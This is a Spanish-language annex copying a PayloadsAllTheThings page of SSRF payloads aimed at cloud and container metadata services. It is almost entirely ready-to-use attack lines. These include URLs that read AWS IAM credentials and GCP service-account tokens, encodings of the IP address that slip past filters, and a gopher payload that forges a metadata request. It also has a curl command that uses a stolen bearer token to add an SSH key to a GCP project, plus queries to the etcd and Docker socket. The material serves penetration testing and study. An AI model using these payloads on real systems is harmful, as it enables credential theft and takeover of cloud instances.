# Server-Side Request Forgery (SSRF): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Server Side Request Forgery/SSRF-Cloud-Instances.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. SSRF URL for Cloud Instances / SSRF URL for AWS

```powershell
  export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
```

```powershell
  http://instance-data
  http://169.254.169.254
  http://169.254.169.254.nip.io/
```

```powershell
  Static:http://nicob.net/redir6a
  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
```

```powershell
  http://425.510.425.510 Dotted decimal with overflow
  http://2852039166 Dotless decimal
  http://7147006462 Dotless decimal with overflow
  http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
  http://0xA9FEA9FE Dotless hexadecimal
  http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
  http://0251.0376.0251.0376 Dotted octal
  http://0251.00376.000251.0000376 Dotted octal with padding
  http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
  http://[::ffff:a9fe:a9fe] IPV6 Compressed
  http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
  http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
  http://[fd00:ec2::254] IPV6
```

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
```

```powershell
http://169.254.169.254/latest/user-data
```

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### Variantes presentes en tablas o texto del apartado

```text
http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token
http://[fd00:ec2::254]/latest/meta-data/
https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
```

## 2. SSRF URL for Cloud Instances / SSRF URL for AWS ECS

```powershell
curl http://169.254.170.2/v2/credentials/<UUID>
```

### Variantes presentes en tablas o texto del apartado

```text
/proc/self/environ
```

## 3. SSRF URL for Cloud Instances / SSRF URL for AWS Elastic Beanstalk

```powershell
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

### Variantes presentes en tablas o texto del apartado

```text
aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/
```

## 4. SSRF URL for Cloud Instances / SSRF URL for AWS Lambda

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

## 5. SSRF URL for Cloud Instances / SSRF URL for Google Cloud

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

### Variantes presentes en tablas o texto del apartado

```text
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
```

## 6. SSRF URL for Google Cloud / Add an SSH key

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

```powershell
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

```powershell
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## 7. SSRF URL for Cloud Instances / SSRF URL for Digital Ocean

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

All in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

### Variantes presentes en tablas o texto del apartado

```text
https://developers.digitalocean.com/documentation/metadata/
```

## 8. SSRF URL for Cloud Instances / SSRF URL for Packetcloud

### Variantes presentes en tablas o texto del apartado

```text
https://metadata.packet.net/userdata
```

## 9. SSRF URL for Cloud Instances / SSRF URL for Azure

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

### Variantes presentes en tablas o texto del apartado

```text
https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
```

## 10. SSRF URL for Cloud Instances / SSRF URL for OpenStack/RackSpace

```powershell
http://169.254.169.254/openstack
```

## 11. SSRF URL for Cloud Instances / SSRF URL for HP Helion

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

## 12. SSRF URL for Cloud Instances / SSRF URL for Oracle Cloud

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

## 13. SSRF URL for Cloud Instances / SSRF URL for Alibaba

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## 14. SSRF URL for Cloud Instances / SSRF URL for Hetzner Cloud

```powershell
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
http://169.254.169.254/hetzner/v1/metadata/availability-zone
http://169.254.169.254/hetzner/v1/metadata/region
```

## 15. SSRF URL for Cloud Instances / SSRF URL for Kubernetes ETCD

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

## 16. SSRF URL for Cloud Instances / SSRF URL for Docker

```powershell
http://127.0.0.1:2375/v1.24/containers/json

Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

## 17. SSRF URL for Cloud Instances / SSRF URL for Rancher

```powershell
curl http://rancher-metadata/<version>/<path>
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
